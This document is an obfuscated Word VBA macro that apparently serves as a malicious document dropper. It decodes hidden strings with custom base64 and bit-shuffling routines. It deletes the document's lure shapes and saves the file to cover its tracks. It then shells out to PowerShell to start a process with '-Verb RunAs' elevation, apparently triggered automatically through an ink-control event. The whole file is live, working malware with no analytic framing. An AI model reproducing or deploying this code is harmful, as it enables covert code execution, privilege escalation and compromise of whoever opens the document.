Public x92jhezTYvK As Integer
Public Sub JezU9Hz8()
On Error Resume Next
BjHhhpSDh3Gu "shape1",True
BjHhhpSDh3Gu "shape2",True
Shell Chr(Int("&H70"))&Chr(&H6f)&Chr(&H77) & Chr(Int("&H65"))&Chr(Int("114"))&Chr(Int("115"))&"h" & Chr(&H65)&"l"&Chr(Int("&H6c"))&Chr(Int("46"))&Chr(101) & S6vCQjaqIO(Chr(Int("52"))&Chr(-2519+2586)&Chr(86)&Chr(Int("83"))&Chr(Int("70"))&Chr(Int("57"))&"K"&Chr(3119-3003)&Chr(Int("43"))&Chr(&H56)&"U"&Chr(Int("61"))) & Chr(97)&Chr(Int("110"))&Chr(&H64)&" " & Chr(34) & Chr(-2900+2983)&Chr(116)&"a" & S6vCQjaqIO(Chr(Int("111"))&Chr(&H6e)&Chr(-996+1101)&Chr(89)&Chr(&H55)&Chr(&H2f)&Chr(4098-3984)&Chr(112)&Chr(88)&Chr(Int("86"))&Chr(56)&"=") & S6vCQjaqIO(Chr(Int("113"))&"u"&Chr(994-906)&Chr(Int("48"))&Chr(Int("87"))&"e"&Chr(68)&Chr(&H4a)&"3"&Chr(2356-2270)&Chr(81)&Chr(&H3d)) & Chr(100)&" "&Chr(45)&"V"&Chr(101) & Chr(Int("114"))&Chr(Int("98"))&Chr(&H20)&"R"&Chr(117) & "n"&Chr(&H41)&Chr(16330/142),vbNormalFocus
End Sub
Private Sub BjHhhpSDh3Gu(ByVal Ao9LAQDvtC As String,ByVal R0f0 As Boolean)
Dim Je4PWGNZLlS As Word.w5UFdEZxYm
On Error Resume Next
For Each Je4PWGNZLlS In ActiveDocument.Shapes
If StrComp(Je4PWGNZLlS.Name,Ao9LAQDvtC)=0 Then
Je4PWGNZLlS.Delete
Exit For
End If
Next
If R0f0 Then
ActiveDocument.Save
End If
End Sub
Private Sub rIQ30(ByVal L9vKS1QlTIwx As Long,ByVal azA2 As MSINKAUTLib.IInkRectangle)
If x92jhezTYvK<1 Then
JezU9Hz8
End If
x92jhezTYvK=x92jhezTYvK+1
End Sub
Public Function i0dzGL(ByVal BllrfWRlT1m As Long,ByVal XK4UKtit5Ze As Byte) As Long
i0dzGL=BllrfWRlT1m
If XK4UKtit5Ze>0 Then
If BllrfWRlT1m>0 Then
i0dzGL=Int(i0dzGL/(2^XK4UKtit5Ze))
Else
If XK4UKtit5Ze>31 Then
i0dzGL=0
Else
i0dzGL=i0dzGL And &H7FFFFFFF
i0dzGL=Int(i0dzGL/(2^XK4UKtit5Ze))
i0dzGL=i0dzGL Or 2^(31-XK4UKtit5Ze)
End If
End If
End If
End Function
Public Function j8OLASOYsB(ByVal BllrfWRlT1m As Long,ByVal XK4UKtit5Ze As Byte) As Long
j8OLASOYsB=BllrfWRlT1m
If XK4UKtit5Ze>0 Then
Dim i As Byte
Dim m As Long
For i=1 To XK4UKtit5Ze
m=j8OLASOYsB And &H40000000
j8OLASOYsB=(j8OLASOYsB And &H3FFFFFFF)*2
If m<>0 Then
j8OLASOYsB=j8OLASOYsB Or &H80000000
End If
Next i
End If
End Function
Public Function n62sZSbgYCb(ByVal z4uZlqexJ As Long) As Long
Const QrSOD As Long=5570645
Const zr4JngoFAy3 As Long=52428
Const d1=7
Const d2=14
Dim t As Long,u,out As Long
t=(z4uZlqexJ Xor i0dzGL(z4uZlqexJ,d2)) And zr4JngoFAy3
u=z4uZlqexJ Xor t Xor j8OLASOYsB(t,d2)
t=(u Xor i0dzGL(u,d1)) And QrSOD
out=(u Xor t Xor j8OLASOYsB(t,d1))
n62sZSbgYCb=out
End Function
Public Function ctERWMk6Q5mE(ByRef Tt3eVts69() As Byte) As String
Dim i,fr,u3pwP,raw As Long
Dim a As String,b As String,c As String,d As String
Dim l7cF0Kjv5jM9 As String
Dim USwFqT0fB() As String
Dim a2,b2 As String
l7cF0Kjv5jM9=""
For i=0 To (UBound(Tt3eVts69)/4+1)
fr=i*4
If fr>UBound(Tt3eVts69) Then
Exit For
End If
u3pwP=0
u3pwP=u3pwP Or j8OLASOYsB(Tt3eVts69(fr+3),24)
u3pwP=u3pwP Or j8OLASOYsB(Tt3eVts69(fr+2),16)
u3pwP=u3pwP Or j8OLASOYsB(Tt3eVts69(fr+1),8)
u3pwP=u3pwP Or Tt3eVts69(fr+0)
raw=n62sZSbgYCb(u3pwP)
a=Chr(i0dzGL((raw And &HFF000000),24))
b=Chr(i0dzGL((raw And 16711680),16))
c=Chr(i0dzGL((raw And 65280),8))
d=Chr(i0dzGL((raw And 255),0))
l7cF0Kjv5jM9=l7cF0Kjv5jM9+d+c+b+a
Next i
ctERWMk6Q5mE=l7cF0Kjv5jM9
End Function
Public Function S6vCQjaqIO(Tt3eVts69 As String) As String
Dim n8ZxHJaNkfPMs() As Byte,R2yUrpvO7Zl() As Byte,arrayByte3(255) As Byte
Dim V4ibnNEa9(63) As Long,arrayLong5(63) As Long
Dim d0SGkaIhM(63) As Long,WikQj7 As Long
Dim aXByM9GS As Integer,iter As Long,xKfSJB2 As Long,AbsxNBqJ0r7 As Long
Dim l7cF0Kjv5jM9 As String
Tt3eVts69=Replace(Tt3eVts69,vbCr,vbNullString)
Tt3eVts69=Replace(Tt3eVts69,vbLf,vbNullString)
AbsxNBqJ0r7=Len(Tt3eVts69) Mod 4
If InStrRev(Tt3eVts69,"==") Then
aXByM9GS=2
ElseIf InStrRev(Tt3eVts69,""+"=") Then
aXByM9GS=1
End If
For AbsxNBqJ0r7=0 To 255
Select Case AbsxNBqJ0r7
Case 65 To 90
arrayByte3(AbsxNBqJ0r7)=AbsxNBqJ0r7-65
Case 97 To 122
arrayByte3(AbsxNBqJ0r7)=AbsxNBqJ0r7-71
Case 48 To 57
arrayByte3(AbsxNBqJ0r7)=AbsxNBqJ0r7+4
Case 43
arrayByte3(AbsxNBqJ0r7)=62
Case 47
arrayByte3(AbsxNBqJ0r7)=63
End Select
Next AbsxNBqJ0r7
For AbsxNBqJ0r7=0 To 63
V4ibnNEa9(AbsxNBqJ0r7)=AbsxNBqJ0r7*64
arrayLong5(AbsxNBqJ0r7)=AbsxNBqJ0r7*4096
d0SGkaIhM(AbsxNBqJ0r7)=AbsxNBqJ0r7*262144
Next AbsxNBqJ0r7
R2yUrpvO7Zl=StrConv(Tt3eVts69,vbFromUnicode)
ReDim n8ZxHJaNkfPMs((((UBound(R2yUrpvO7Zl)+1)\4)*3)-1)
For iter=0 To UBound(R2yUrpvO7Zl) Step 4
WikQj7=d0SGkaIhM(arrayByte3(R2yUrpvO7Zl(iter)))+arrayLong5(arrayByte3(R2yUrpvO7Zl(iter+1)))+V4ibnNEa9(arrayByte3(R2yUrpvO7Zl(iter+2)))+arrayByte3(R2yUrpvO7Zl(iter+3))
AbsxNBqJ0r7=WikQj7 And 16711680
n8ZxHJaNkfPMs(xKfSJB2)=AbsxNBqJ0r7\65536
AbsxNBqJ0r7=WikQj7 And 65280
n8ZxHJaNkfPMs(xKfSJB2+1)=AbsxNBqJ0r7\256
n8ZxHJaNkfPMs(xKfSJB2+2)=WikQj7 And 255
xKfSJB2=xKfSJB2+3
Next iter
l7cF0Kjv5jM9=StrConv(n8ZxHJaNkfPMs,vbUnicode)
If aXByM9GS Then l7cF0Kjv5jM9=Left$(l7cF0Kjv5jM9,Len(l7cF0Kjv5jM9)-aXByM9GS)
S6vCQjaqIO=ctERWMk6Q5mE(StrConv(l7cF0Kjv5jM9,vbFromUnicode))
S6vCQjaqIO=wRBoY(S6vCQjaqIO,"~")
End Function
Function wRBoY(GGGYKT As String,B7zN9 As String) As String
Dim Ye6IzaFyTN97 As Long
Dim r3ECITQdZDAu() As String
r3ECITQdZDAu=Split(GGGYKT,B7zN9)
Ye6IzaFyTN97=UBound(r3ECITQdZDAu,1)
If Ye6IzaFyTN97<>0 Then
GGGYKT=Left$(GGGYKT,Len(GGGYKT)-Ye6IzaFyTN97)
End If
wRBoY=GGGYKT
End Function